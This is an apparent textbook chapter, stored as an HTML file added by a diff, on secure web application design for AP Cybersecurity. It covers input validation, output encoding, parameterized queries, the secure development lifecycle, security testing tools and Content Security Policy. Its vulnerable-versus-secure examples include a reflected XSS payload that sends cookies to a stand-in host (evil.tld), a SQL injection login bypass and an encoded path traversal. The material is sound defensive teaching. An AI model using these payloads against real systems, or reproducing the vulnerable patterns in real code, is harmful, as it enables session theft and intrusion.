@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>5.5 Secure Web Application Design · Notes · Aayat-AP-Prep</title>
+<link rel="stylesheet" href="../../assets/notes/theme.css">
+<link rel="stylesheet" href="../../assets/vendor/prismjs-1.29.0/themes/prism-tomorrow.min.css">
+<script>MathJax = { tex: { inlineMath: [['$','$']], displayMath: [['$$','$$']] }, svg: { fontCache: 'global' } };</script>
+<script async src="../../assets/vendor/mathjax-3.2.2/es5/tex-svg.js"></script>
+<script src="../../assets/vendor/prismjs-1.29.0/prism.min.js"></script>
+<script src="../../assets/vendor/prismjs-1.29.0/components/prism-bash.min.js"></script>
+<script src="../../assets/vendor/jszip-3.10.1/jszip.min.js"></script>
+<script>window.EBOOK_META = { topicId: "5.5", topicTitle: "Protecting Applications", chapterLabel: "Topic 5.5" };</script>
+</head>
+<body>
+<nav class="top-nav">
+  <div class="actions">
+    <button class="print-action-btn" onclick="window.print()">Print Chapter</button>
+    <button class="epub-btn" onclick="exportChapterEPUB()">&#8681; EPUB</button>
+    <button class="epub-btn secondary" onclick="downloadOkularSidecar()">Okular Notes</button>
+  </div>
+</nav>
+
+<div class="reading-container">
+  <article class="textbook-chapter">
+    <h1 class="textbook-title">Topic 5.5</h1>
+    <h2 class="textbook-subtitle">Protecting Applications</h2>
+    <div class="outline-box">
+      <h4>Chapter Contents</h4>
+      <ul>
+        <li><a href="#sec-foundations">I. Secure by Design and Secure by Default</a></li>
+        <li><a href="#sec-technical">II. Security Gates, Testing Tools, and Input/Output Handling</a></li>
+        <li><a href="#sec-case">III. Case Studies: Equifax and British Airways</a></li>
+        <li><a href="#sec-protection">IV. Secure Development Standards: Validation, Encoding, Defaults, Verification</a></li>
+        <li><a href="#sec-bibliography">V. References and Further Reading</a></li>
+      </ul>
+    </div>
+
+<div class="ap-alignment">
+  <h4>AP Cybersecurity Alignment</h4>
+  <p><strong>Unit 5: Securing Applications and Data</strong> &middot; Topic 5.5, Protecting Applications</p>
+  <ul>
+    <li><span class="ap-code">5.5.A</span> <span class="ap-skill">Mitigate Risk</span><br>Recognise the two principles that govern how security enters a product: designing so that whole classes of defect cannot be written, and shipping in a configuration that is already the safe one before anybody has touched a setting.</li>
+    <li><span class="ap-code">5.5.B</span> <span class="ap-skill">Mitigate Risk</span><br>Explain what checking untrusted input actually protects, which interpreter is prevented from receiving syntax it would have obeyed, and where the check has to run, why an allowlist beats a denylist, and which downstream defences validation cannot replace.</li>
+  </ul>
+  <p class="ap-source">Objective codes follow the <a href="https://apcentral.collegeboard.org/media/pdf/ap-cybersecurity-course-framework.pdf" target="_blank" rel="noopener">AP Cybersecurity Course Framework</a> (College Board, AP Career Kickstart). Objectives are paraphrased here, not quoted.</p>
+</div>
+
+    <div class="chapter-body">
+      <section class="textbook-section" id="sec-foundations">
+        <h3>I. Secure by Design and Secure by Default</h3>
+
+<p>Most breach post-mortems eventually arrive at the same uncomfortable conclusion: the vulnerability was not introduced by a sophisticated adversary probing an impenetrable wall, but was baked into the application during design and development, waiting patiently for someone to notice. <span class="annot">Secure Web Application Design<span class="tip"><strong>Secure Web Application Design</strong>The discipline of building software so that security is an intrinsic property of the system rather than a bolt-on feature added after deployment. It spans everything from how a login form validates a username to how a database driver constructs a SQL query. <em>Formalized in standards such as OWASP ASVS (Application Security Verification Standard) and NIST SP 800-218 (Secure Software Development Framework).</em></span></span> is the academic and engineering discipline concerned with eliminating entire vulnerability classes at the point of construction, rather than relying exclusively on perimeter controls like firewalls or web application firewalls to catch exploitation attempts after the fact. This chapter examines the philosophical shift toward <span class="annot">secure-by-design<span class="tip"><strong>Secure-by-Design</strong>An engineering philosophy in which security is a primary design constraint from the very first architecture diagram, not a checklist applied at the end. The manufacturer or developer takes ownership of the security outcomes of their product rather than pushing that burden onto the customer. <em>Formalized by CISA's April 2023 "Secure by Design" pledge, co-signed by major software vendors including Microsoft, Google, and AWS. See CISA, "Shifting the Balance of Cybersecurity Risk" (2023).</em></span></span> and <span class="annot">secure-by-default<span class="tip"><strong>Secure-by-Default</strong>A companion principle to secure-by-design: the out-of-the-box configuration of a product should already be the safest reasonable configuration, without requiring the customer to enable protective features manually. Think of a new phone that ships with a lock screen already required, rather than one that ships open and expects the user to turn security on. <em>CISA/NSA joint guidance "Secure by Design and Default" (2023) instructs vendors to eliminate default passwords and enable logging/MFA out of the box.</em></span></span> engineering, the structured process known as the <span class="annot">Secure Development Lifecycle (SDLC)<span class="tip"><strong>Secure Development Lifecycle (SDLC)</strong>A version of the standard software development lifecycle (plan, design, build, test, release, maintain) with dedicated security checkpoints inserted at every phase, rather than a single penetration test right before launch. <em>NIST SP 800-218, the Secure Software Development Framework (SSDF), organizes SDLC security practices into four groups: Prepare the Organization, Protect the Software, Produce Well-Secured Software, and Respond to Vulnerabilities.</em></span></span> that operationalizes it, and the specific technical controls, input validation, output encoding, parameterized queries, and secure defaults, that together form a layered defense against the most common web application vulnerability classes.</p>
+
+<p>Historically, application security was treated as a downstream concern: developers wrote functional code, and a separate security team tested it afterward, usually under deadline pressure, using a black-box penetration test that could only catch what it happened to probe. This model produces what security researchers call the "penetrate and patch" cycle, a perpetual game of catching vulnerabilities after they have already shipped to production, where the cost of remediation is dramatically higher than if the flaw had been caught during design. Academic research on software defect economics (notably work traced back to IBM's Systems Sciences Institute) consistently finds that a defect caught during the requirements or design phase costs roughly an order of magnitude less to fix than the same defect caught in production. Security defects behave the same way: an injection flaw identified during a threat-modeling session costs a design revision, while the same flaw discovered by an attacker in production can cost an organization millions of dollars in incident response, regulatory fines, and reputational harm.</p>
+
+<div class="prof-note">
+  <span class="prof-note-label">A Web Application Firewall Is a Deadbolt on a House with Open Windows</span>
+  Imagine building a house and only thinking about locks after the walls, windows, and doors are already installed. You can add a deadbolt to the front door, but if the architect never considered security, you might discover the ground-floor windows don't lock, the crawlspace has no barrier, and the electrical panel is accessible from the driveway. Bolt-on security in software is the same problem: a web application firewall (WAF) sitting in front of a vulnerable application is a deadbolt on a house with unlocked windows. Secure-by-design means the architect thought about every entry point <em>before</em> pouring the foundation.
+</div>
+
+<p>The theoretical backbone of secure-by-design thinking is the recognition that a web application is fundamentally a <span class="annot">trust boundary<span class="tip"><strong>Trust Boundary</strong>An imaginary line separating data or code that a system trusts from data or code that it does not, and must therefore validate before using. The most important trust boundary in a web application sits between the user's browser (untrusted) and the server's business logic and database (trusted). <em>Formal threat-modeling methodologies like STRIDE and Microsoft's Threat Modeling Tool require explicit diagramming of every trust boundary crossing in a system.</em></span></span> problem. Every web application accepts input from an inherently untrusted source, the end user's browser, and that input eventually crosses into trusted execution contexts: a SQL query, an HTML page rendered to other users, a filesystem path, an operating system command, or an authorization decision. The entire discipline of secure coding can be summarized as rigorously managing what happens at each of these boundary crossings. The <span class="annot">OWASP Top 10<span class="tip"><strong>OWASP Top 10</strong>A regularly updated, industry-consensus ranked list of the ten most critical web application security risks, published by the Open Worldwide Application Security Project. It is the de facto baseline standard referenced in compliance frameworks like PCI-DSS. <em>The 2021 edition lists A03:2021 – Injection and A05:2021 – Security Misconfiguration among the most impactful categories; broken access control moved to #1.</em></span></span>, the industry's most widely cited taxonomy of application risk, is dominated by exactly these trust-boundary failures: injection, broken access control, cryptographic failures, and security misconfiguration are all, at their root, cases where untrusted input or an unsafe default was allowed to influence a trusted operation without adequate mediation.</p>
+
+<p>A second conceptual pillar is <span class="annot">defense-in-depth<span class="tip"><strong>Defense-in-Depth</strong>A layered security strategy in which multiple independent controls each address the same risk, so that the failure of any single control does not result in a full compromise. Borrowed from military strategy, where an attacker must break through successive lines of defense rather than a single wall. <em>NIST SP 800-53 organizes controls into families precisely so that technical, administrative, and physical layers reinforce one another. See also NIST SP 800-160 Vol. 1 for systems security engineering.</em></span></span> applied specifically to the application layer: input validation, output encoding, parameterized data access, and secure configuration are not redundant if implemented correctly, they are independent layers that each close a slightly different gap. A parameterized query prevents SQL injection even if input validation is imperfect; output encoding prevents cross-site scripting even if an attacker manages to store malicious data; secure default configurations limit blast radius even if a control elsewhere fails. This layering mirrors the network-security concept of defense-in-depth that students encounter elsewhere in the course, but it operates entirely within the boundaries of a single application's codebase.</p>
+
+<div class="prof-note connection">
+  <span class="prof-note-label">Network Controls and Application Controls Are Not Substitutes</span>
+  Earlier units emphasized network-layer defense-in-depth: firewalls, network segmentation, IDS/IPS. Topic 5.5 is the application-layer mirror of that same philosophy. A firewall cannot distinguish a legitimate SQL query from a malicious one, both travel over port 443 inside an encrypted HTTPS session. The two families of control are complementary rather than interchangeable, and the reason is a matter of visibility: a perimeter device makes decisions from what it can parse, and an injection payload inside an authenticated TLS session is, at every layer that device inspects, an ordinary request. Perimeter security stops what it can see. Secure application design stops what perimeter security structurally cannot.
+</div>
+
+
+<h4>What Secure by Design and Secure by Default Actually Require</h4>
+<p>The two phrases are often used as a single slogan, and they are not the same claim. <strong>Secure by design</strong> is a statement about where security decisions are made: during architecture, as constraints on the design rather than as features added to it. It shows up as concrete design commitments, a data-flow diagram with every trust boundary drawn and a threat enumerated at each crossing; a choice of memory-safe language for components that parse untrusted input; an authorization model in which every object-addressed route re-derives the caller's entitlement from the session rather than trusting an identifier; a decision that the application will never construct a SQL statement by concatenation, enforced by a build rule rather than by a convention. The test of whether a team is doing this is not whether they say so but whether any of these decisions could still be reversed cheaply, which is another way of saying whether the decisions were made before the code was written.</p>
+<p><strong>Secure by default</strong> is a statement about the state a system is in when nobody has configured it: the shipped configuration is already the safe one, and the customer's effort is required to weaken it rather than to strengthen it. In practice this means no default administrative password, and no account that works before it is created; multi-factor authentication and audit logging enabled out of the box rather than sold as a tier upgrade; TLS on and unencrypted transport off; permissions granted narrowly with escalation available on request; and a system that fails closed, denying access when an authorization service is unreachable or a session cannot be evaluated, rather than one that fails open. The CISA and NSA joint guidance, <a href="https://www.cisa.gov/resources-tools/resources/secure-by-design" target="_blank" rel="noopener">Shifting the Balance of Cybersecurity Risk</a>, frames both principles as a transfer of burden: the party who can most cheaply prevent a class of defect is the manufacturer, and every hardening step a vendor leaves to its customers will be skipped by most of them.</p>
+<p>The two principles fail in different ways, which is the practical reason for keeping them apart. A system can be secure by design and insecure by default, a well-architected product that ships with debug logging exposed and a documented initial password is the everyday example, and it is how vast numbers of internet-facing devices end up compromised without any software defect being involved. A system can equally be secure by default and unsound by design, a hardened out-of-the-box configuration on an application that builds its queries by concatenation is a locked front door on a building with no interior walls. Only one of these can be repaired by a configuration change.</p>
+
+<h4>Allowlist and Denylist Validation, and Why the Server Must Do It</h4>
+<p>An <strong>allowlist</strong> states what is permitted and rejects everything else; a <strong>denylist</strong> states what is forbidden and permits everything else. The asymmetry between them is not a matter of thoroughness but of who has to be complete. An allowlist requires the defender to know their own data, which they do: a US postal code is five digits, optionally followed by a hyphen and four more; an account identifier is a positive integer within a known range; a filename comes from a fixed server-side table rather than from the request at all. A denylist requires the defender to have anticipated every representation an attacker might invent, and attackers invent representations for a living, mixed case, URL encoding, double URL encoding, overlong UTF-8, Unicode homoglyphs and normalization forms, null bytes, and dialect-specific syntax the filter's author never encountered. A denylist that rejects <code>&lt;script</code> is defeated by <code>&lt;img src=x onerror=...&gt;</code>; one that also rejects <code>onerror</code> is defeated by the next event attribute in the HTML specification.</p>
+<p>Validation must also be ordered correctly with respect to decoding. Checking a value before it has been decoded into its final form is the canonicalization failure described above, and it is worth stating the rule positively: decode and normalise first, exactly once, then validate the canonical form, then act on that same canonical value, never re-decode afterwards.</p>
+<p>Where the validation runs is a separate and larger point. Client-side checks exist for the user's benefit: they give immediate feedback and save a round trip. They provide no security whatsoever, because the browser is under the attacker's control. A request can be composed by <code>curl</code>, by an intercepting proxy, by a script, or by a browser with the page's JavaScript modified in the developer console; in none of these cases does the validation code ever execute. The consequence is a rule with no exceptions: every check that a security decision depends on runs on the server, after the request arrives, on the server's own copy of the data. Client-side validation may duplicate a server-side rule for usability; it may never be the only place the rule exists. The same reasoning extends to anything else the client is asked to hold, a price in a hidden form field, a role name in a cookie, a total in a JavaScript variable. If the server does not recompute it, the client decided it.</p>
+<p>Finally, validation is a control at the entrance, and it does not substitute for the controls at each exit. A name containing an apostrophe is legitimate data that must be accepted, stored, rendered into HTML, and possibly written into a SQL statement; validation cannot reject it, and the safety of each of those downstream uses depends on the encoding or parameterisation applied there. This is why the layers in this chapter are independent rather than redundant.</p>
+      </section>
+
+      <section class="textbook-section" id="sec-technical">
+        <h3>II. Security Gates, Testing Tools, and Input/Output Handling</h3>
+
+<h4>The Secure Development Lifecycle and Its Security Gates</h4>
+<p>The <span class="annot">SDLC<span class="tip"><strong>SDLC, Software Development Lifecycle</strong>The structured sequence of phases a piece of software moves through from conception to retirement: requirements, design, implementation, testing, release, and maintenance. Adding "secure" in front (SSDLC) means each phase has explicit security deliverables. <em>NIST SP 800-64 Rev. 2, "Security Considerations in the System Development Life Cycle," is the foundational federal guidance.</em></span></span> embeds discrete security checkpoints, often called gates, into each phase of development so that a project cannot silently advance with unresolved security risk:</p>
+<ul>
+  <li><strong>Requirements:</strong> Security requirements (authentication strength, data classification, regulatory obligations such as PCI-DSS or HIPAA) are captured alongside functional requirements, not as an afterthought.</li>
+  <li><strong>Design / Threat Modeling:</strong> Architects formally enumerate how the system could be attacked using structured methodologies such as <span class="annot">STRIDE<span class="tip"><strong>STRIDE</strong>A threat-modeling mnemonic developed at Microsoft: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Each category prompts the design team to ask "how could an attacker do this to my system?" for every component and data flow. <em>Introduced by Loren Kohnfelder and Praerit Garg at Microsoft in 1999; still the most widely taught threat-modeling framework.</em></span></span>, producing data-flow diagrams and identifying trust boundary crossings before a single line of code is written.</li>
+  <li><strong>Implementation:</strong> Developers write code against secure coding standards, use vetted libraries and frameworks rather than hand-rolled cryptography or query construction, and undergo peer code review.</li>
+  <li><strong>Verification / Testing:</strong> Automated <span class="annot">SAST<span class="tip"><strong>SAST, Static Application Security Testing</strong>Automated analysis of source code (without running it) to find patterns known to be dangerous, such as string concatenation flowing into a SQL query, or user input flowing into an HTML response without encoding. Runs as part of the build pipeline, often on every commit. <em>SAST tools include Semgrep, SonarQube, Checkmarx, and CodeQL. Complementary to DAST (Dynamic Application Security Testing), which probes the running application from the outside.</em></span></span> scanning, DAST scanning, and manual penetration testing occur before code reaches production, catching the exact vulnerability classes discussed below.</li>
+  <li><strong>Release:</strong> A final security sign-off gate confirms that all critical and high findings from testing have been remediated or formally risk-accepted by an authorized owner.</li>
+  <li><strong>Response:</strong> Post-release, a vulnerability disclosure and patch management process (aligned with frameworks like NIST SP 800-218's "Respond to Vulnerabilities" practice group) ensures newly discovered flaws are triaged and fixed on a defined timeline.</li>
+</ul>
+
+<div class="prof-note exam-focus">
+  <span class="prof-note-label">Each Security Activity Belongs to Exactly One Phase</span>
+  Placing an activity in the wrong phase is not a labelling error; it changes what the activity can find. Threat modelling belongs to <strong>Design</strong> because its output is an architectural change, and an architectural change made after implementation is a rewrite. Peer code review belongs to <strong>Implementation</strong>, because it examines source that has been written but not yet integrated. Static and dynamic scanning belong to <strong>Verification</strong>, and they differ from review in what they see: static analysis reads code that need not run, while dynamic analysis probes a deployed instance and therefore observes configuration, framework defaults, and the effect of the deployment environment, things no amount of source reading reveals. The economic argument follows the same shape: a flaw found in Design costs a diagram, the same flaw found in Response costs an incident.
+</div>
+
+
+<h4>SAST, DAST and IAST: Three Instruments, Three Blind Spots</h4>
+<p>The Verification gate is usually staffed by tools rather than by people, and the three families in common use answer different questions. Choosing between them is a false framing; the useful question is which defects each one structurally cannot see.</p>
+<p><span class="annot">Static application security testing<span class="tip"><strong>SAST</strong>Analysis of source code, bytecode, or binaries without executing the program, typically by building a model of how data flows from an untrusted source to a dangerous sink. <em>Runs early and on every commit; sees all code paths, including ones no test exercises.</em></span></span> reads the code without running it, tracing data from sources it considers untrusted to sinks it considers dangerous. Its advantages follow from that: it runs on the first commit, before anything is deployable; it reaches code paths no test case exercises; and it points at a file and a line, so the finding is directly actionable. Its blind spots follow equally: it sees no runtime configuration, no environment variables, no reverse-proxy behaviour, and no defect that only exists once several services are composed. It also has a characteristic failure mode, false positives, because a static model of reachability must be conservative, and a team that responds to a noisy scanner by suppressing its output has purchased nothing.</p>
+<p><span class="annot">Dynamic application security testing<span class="tip"><strong>DAST</strong>Testing a running application from the outside, sending crafted requests and inspecting responses, with no access to source. <em>Sees the deployed system as an attacker does, including configuration and infrastructure, but only the parts it can reach.</em></span></span> attacks a running instance from the outside with no knowledge of the source, which is exactly the attacker's position. It therefore finds what actually exists in the deployed environment: a missing security header, a verbose error page, a misconfigured cross-origin policy, a forgotten administrative endpoint, a TLS configuration nobody reviewed. Its blind spot is coverage. It can only test what it can reach, so an endpoint behind an unusual authentication flow, a multi-step workflow, or a client that speaks a protocol the scanner does not crawl is simply not tested, and the report will not say so. Its findings also arrive late, against a deployed build, and locate a symptom at a URL rather than a defect at a line.</p>
+<p><span class="annot">Interactive application security testing<span class="tip"><strong>IAST</strong>Instrumentation inside the running application, typically an agent in the language runtime, that observes real data flow during functional or dynamic tests. <em>Combines a static tool's view of the code path with a dynamic tool's view of the deployment, at the cost of language support and runtime overhead.</em></span></span> places an agent inside the running application, so it watches actual data move through real code while the application is exercised by ordinary functional tests or by a dynamic scanner. Because it observes a genuine execution rather than a model of one, its false-positive rate is characteristically low and its findings carry both a request and a stack trace. The costs are real: it requires runtime support for the language, it imposes overhead, and its coverage is bounded by whatever the test suite happens to exercise, an application with thin functional tests gets a thin IAST result.</p>
+<p>Two further instruments belong beside these, since most modern findings are not in first-party code at all. <em>Software composition analysis</em> inventories third-party dependencies and matches them against published advisories, which is the control that would have flagged the Struts component in the Equifax case. <em>Secret scanning</em> examines commits for credentials and keys, a defect class that no data-flow analysis is designed to notice. The mature arrangement is not a single tool but a sequence: composition analysis and secret scanning on every commit, static analysis on every pull request, dynamic and interactive testing against a staging build, and manual review reserved for the design and authorization logic that none of the four can reason about.</p>
+<h4>Input Validation and Sanitization</h4>
+<p><span class="annot">Input validation<span class="tip"><strong>Input Validation</strong>The process of checking that data received from a user or another system conforms to strict expectations (type, length, format, range) before the application acts on it. Validation should reject anything that does not conform, rather than trying to "clean up" unexpected input. <em>OWASP Input Validation Cheat Sheet recommends validation as close to the point of input as possible, but never as a substitute for output encoding or parameterized queries.</em></span></span> is the first line of defense at every trust boundary. The critical design decision is choosing between <span class="annot">allowlisting<span class="tip"><strong>Allowlisting (Positive Validation)</strong>Defining the exact, finite set of characters, formats, or values that are permitted, and rejecting everything else by default. For a US ZIP code field, an allowlist might be "exactly five digits." Anything that doesn't match is rejected outright. <em>OWASP considers allowlisting the strongest input validation strategy because it does not require the defender to predict every possible malicious variation.</em></span></span> and <span class="annot">denylisting<span class="tip"><strong>Denylisting (Negative Validation / Blocklisting)</strong>Defining a list of known-bad characters, patterns, or values and rejecting only those, while permitting everything else by default. Denylists are structurally weaker because they require the defender to anticipate every dangerous variation an attacker might invent, including encoding tricks. <em>Classic denylist failure: blocking the literal string "SELECT" while an attacker submits "SeLeCt" or a URL-encoded variant that decodes to the same command.</em></span></span>. Allowlisting is structurally superior because it defines security as the default state, anything not explicitly permitted is rejected, while denylisting requires defenders to predict every possible malicious variant an attacker might construct, a losing proposition given the near-infinite ways malicious payloads can be encoded, obfuscated, or restructured.</p>
+
+<p>A particularly insidious failure mode is a <span class="annot">canonicalization<span class="tip"><strong>Canonicalization</strong>The process of converting data into a single, standard ("canonical") representation before validating or acting on it. Canonicalization vulnerabilities occur when validation happens BEFORE data is fully decoded or normalized, allowing an attacker to smuggle a malicious payload past the filter using an alternate encoding that decodes to the dangerous value only afterward. <em>Classic example: validating a file path for "../" before URL-decoding, allowing "%2e%2e%2f" to bypass the check and later decode into a path traversal sequence.</em></span></span> error, in which validation is performed on data before it has been fully decoded or normalized into its final form. For example, if an application checks a submitted file path for the sequence <code>../</code> before URL-decoding the request, an attacker can submit <code>%2e%2e%2f</code>, which passes the check because the literal string <code>../</code> is not present, but which decodes to <code>../</code> immediately afterward, reintroducing a <span class="annot">path traversal<span class="tip"><strong>Path Traversal / Directory Traversal</strong>An attack that uses relative path sequences like "../" to escape an intended directory and access files elsewhere on the filesystem, such as configuration files or credential stores outside the web root. <em>Classified as CWE-22. Mapped to MITRE ATT&amp;CK T1083 in post-exploitation contexts.</em></span></span> vulnerability the filter was supposed to prevent. The correct order of operations is: fully decode and normalize input to its canonical form first, then validate.</p>
+
+<div class="prof-note critical">
+  <span class="prof-note-label">Validation Guards the Entrance; It Cannot Guard Every Exit</span>
+  A recurring misconception (also documented directly in the study materials for this topic) is that relying on client-side browser validation, or even a single well-written server-side filter, is sufficient. It is not. Attackers routinely bypass browser-based JavaScript validation entirely by crafting raw HTTP requests with tools like Burp Suite or curl, the browser is never involved. <strong>All validation must occur on the server</strong>, and even server-side input validation must be paired with output encoding and parameterized queries as independent, redundant layers, because input validation alone cannot anticipate every downstream context a piece of data will be used in.
+</div>
+
+<h4>Output Encoding: Context-Aware Defense Against XSS</h4>
+<p><span class="annot">Output encoding<span class="tip"><strong>Output Encoding</strong>Transforming data immediately before it is written into a specific output context (HTML body, HTML attribute, JavaScript string, URL, CSS) so that any characters with special meaning in that context are rendered as inert literal text rather than executable syntax. <em>OWASP's XSS Prevention Cheat Sheet defines distinct encoding rules for each of these contexts because a single universal encoding scheme is not sufficient.</em></span></span> is the primary defense against <span class="annot">cross-site scripting (XSS)<span class="tip"><strong>Cross-Site Scripting (XSS)</strong>A vulnerability class in which an attacker's input is echoed back into a web page without proper encoding, causing the victim's browser to execute it as active script instead of displaying it as inert text. Reflected XSS bounces the payload off a URL parameter in a single request; stored XSS persists the payload in a database so it fires for every visitor. <em>CWE-79. Consistently ranks among the OWASP Top 10 (A03:2021 – Injection covers it under the broader injection umbrella).</em></span></span>, and it must be <span class="annot">context-aware<span class="tip"><strong>Context-Aware Encoding</strong>Applying a different, specifically appropriate encoding function depending on exactly where in the output the untrusted data will land, because a character that is dangerous in an HTML body (like &lt;) is not the dangerous character in a JavaScript string (like a quote or backslash), and vice versa. <em>Using the wrong encoding for the wrong context is one of the most common real-world causes of "encoded but still exploitable" XSS bugs.</em></span></span> because the same piece of data can be dangerous for different reasons depending on where it is rendered:</p>
+<ul>
+  <li><strong>HTML body context:</strong> encode <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, and <code>'</code> as HTML entities (<code>&amp;lt;</code>, <code>&amp;gt;</code>, etc.) so a user-supplied <code>&lt;script&gt;</code> tag renders as visible text rather than executing.</li>
+  <li><strong>JavaScript string context:</strong> escape quotes, backslashes, and line terminators so injected data cannot break out of a quoted string literal and inject new script statements.</li>
+  <li><strong>URL context:</strong> percent-encode reserved characters so injected data cannot alter the structure of a query string or redirect target.</li>
+  <li><strong>HTML attribute context:</strong> quote all attribute values and encode quote characters, since an unquoted attribute allows injection via whitespace alone.</li>
+</ul>
+
+<p>The following example contrasts a vulnerable reflection with a properly encoded one, directly reflecting the "reflected user script inputs" vulnerability class emphasized in this unit's threat model, an attacker-supplied query parameter reflected unsafely into an HTML page (as seen in the SAST finding <code>Insecure input reflection on page profile.php</code>):</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">php, VULNERABLE</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code>&lt;?php
+// profile.php, VULNERABLE: raw reflection of user input into HTML
+$username = $_GET['username'];
+echo "&lt;h1&gt;Welcome back, " . $username . "&lt;/h1&gt;";
+// Attacker request:
+//   profile.php?username=&lt;script&gt;fetch('https://evil.tld/steal?c='+document.cookie)&lt;/script&gt;
+// Result: attacker JavaScript executes in the victim's authenticated browser session.
+?&gt;</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">php, SECURE</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code>&lt;?php
+// profile.php, SECURE: context-aware HTML entity encoding at the output boundary
+$username = $_GET['username'];
+echo "&lt;h1&gt;Welcome back, " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8') . "&lt;/h1&gt;";
+// The same payload is now rendered as literal, inert text:
+//   Welcome back, &amp;lt;script&amp;gt;fetch('https://evil.tld/steal?c='+document.cookie)&amp;lt;/script&amp;gt;
+// The browser displays the tag as text; it does not execute it.
+?&gt;</code></pre>
+</div>
+
+<h4>Injection and Parameterized Queries</h4>
+<p><span class="annot">SQL injection<span class="tip"><strong>SQL Injection</strong>An attack in which untrusted input is concatenated directly into a SQL query string, allowing an attacker to alter the query's logic, for example, turning a login check into one that always returns true, or appending a second query that dumps an entire table. <em>CWE-89. Consistently the flagship example under OWASP A03:2021 – Injection.</em></span></span> remains the canonical example of a trust-boundary failure: user input is concatenated directly into a command string that is then interpreted by a downstream engine (here, a SQL database) as executable syntax rather than inert data. The defense is not "better validation" of the input string, it is architectural: <span class="annot">parameterized queries<span class="tip"><strong>Parameterized Queries / Prepared Statements</strong>A database API pattern in which the SQL query structure (with placeholders) is sent to the database separately from the user-supplied values that fill those placeholders. The database compiles the query structure first; the values are then bound as pure data and can never be reinterpreted as SQL syntax, no matter what characters they contain. <em>Supported natively by virtually every modern database driver: PDO in PHP, java.sql.PreparedStatement in Java, parameterized cursor.execute() in Python's DB-API.</em></span></span> (also called prepared statements) separate the query's structure from its data at the protocol level, so that no user-supplied value, regardless of what characters it contains, can ever be reinterpreted as SQL syntax.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">python, VULNERABLE</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code># VULNERABLE: string concatenation builds the query dynamically
+username = request.form['username']
+password = request.form['password']
+query = "SELECT id FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+cursor.execute(query)
+# Attacker submits username = admin' --
+# Resulting query: SELECT id FROM users WHERE username = 'admin' -- ' AND password = '...'
+# The trailing "--" comments out the password check entirely. Authentication bypassed.</code></pre>
+</div>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">python, SECURE</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code># SECURE: parameterized query, structure and data sent separately
+username = request.form['username']
+password = request.form['password']
+query = "SELECT id FROM users WHERE username = %s AND password_hash = %s"
+cursor.execute(query, (username, hash_password(password)))
+# The database receives the fixed query template and the untrusted values
+# as separate protocol fields. "admin' -- " is bound as a literal string
+# value to compare against the username column, it can never alter the
+# query's logical structure, regardless of embedded quotes or comments.</code></pre>
+</div>
+
+<div class="prof-note exam-focus">
+  <span class="prof-note-label">Sanitisation Patches the Symptom; Parameterisation Removes the Cause</span>
+  Faced with a concatenated query, there is one remediation and several plausible-sounding substitutes for it. Escaping quote characters is a denylist patch on an unsafe pattern: it asks the application to predict how a different piece of software will parse a string, and that prediction has to hold across every character set the database accepts and every dialect quirk it has. It also does nothing for a value interpolated where no string literal exists, a numeric comparison, a <code>LIMIT</code> clause, an <code>ORDER BY</code> column. Parameterisation removes the prediction: the statement is parsed and planned while the attacker's value is not yet on the server, and the value is then bound into a finished plan as a typed argument. The vulnerability class is gone rather than filtered. The one construct parameterisation cannot cover is an identifier, a table or column name, which is syntax and not data, and that case must be handled by mapping the user's choice through a fixed server-side allowlist, never by interpolation.
+</div>
+
+<h4>Secure Defaults and Content Security Policy</h4>
+<p>Secure-by-default configuration means an application ships already hardened: unnecessary services disabled, default administrative credentials removed, verbose error messages suppressed in production, and permissions granted on a <span class="annot">least privilege<span class="tip"><strong>Principle of Least Privilege</strong>Granting a user, process, or service account only the minimum permissions required to perform its function, and nothing more. If a component only needs to read a table, it should not have write or delete permissions on that table. <em>Formalized in NIST SP 800-53 control AC-6. Referenced directly in this topic's study guide as enforcing "least privilege access permissions (e.g. chmod 700 owner-only restricts)."</em></span></span> basis by default rather than requiring an administrator to manually lock things down after installation. A system that "fails closed", denying access when a control cannot make a clear decision, such as an expired session or an unreachable authorization service, is markedly safer than one that "fails open" and grants access by default under ambiguous conditions.</p>
+
+<p>One of the most effective secure-default browser controls available to web applications is the <span class="annot">Content-Security-Policy (CSP)<span class="tip"><strong>Content-Security-Policy (CSP)</strong>An HTTP response header that instructs the browser which sources of script, style, image, and other content are allowed to load and execute on a page, acting as a browser-enforced allowlist. Even if an XSS payload is somehow reflected into the page, a strict CSP can prevent the injected script from executing because it did not originate from an approved source. <em>W3C Content Security Policy Level 3 specification. CSP is a defense-in-depth layer, it does not replace output encoding, but substantially reduces the impact of an encoding failure.</em></span></span> header, which acts as a browser-enforced allowlist for where active content is permitted to load from:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header">
+    <span class="lang-badge">http</span>
+    <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  </div>
+<pre class="language-bash"><code>Content-Security-Policy: default-src 'self';
+  script-src 'self' https://cdn.trusted-vendor.com;
+  style-src 'self';
+  object-src 'none';
+  base-uri 'self';
+  frame-ancestors 'none';
+  upgrade-insecure-requests</code></pre>
+</div>
+<ul>
+  <li><code>default-src 'self'</code>: fallback policy, only load content from the application's own origin unless overridden below.</li>
+  <li><code>script-src 'self' https://cdn.trusted-vendor.com</code>: scripts may only execute if they are served from the application's own origin or one explicitly named vendor CDN, an attacker-injected inline <code>&lt;script&gt;</code> tag or a script tag pointing at an attacker-controlled domain will be blocked outright by the browser, even if it made it into the page's HTML.</li>
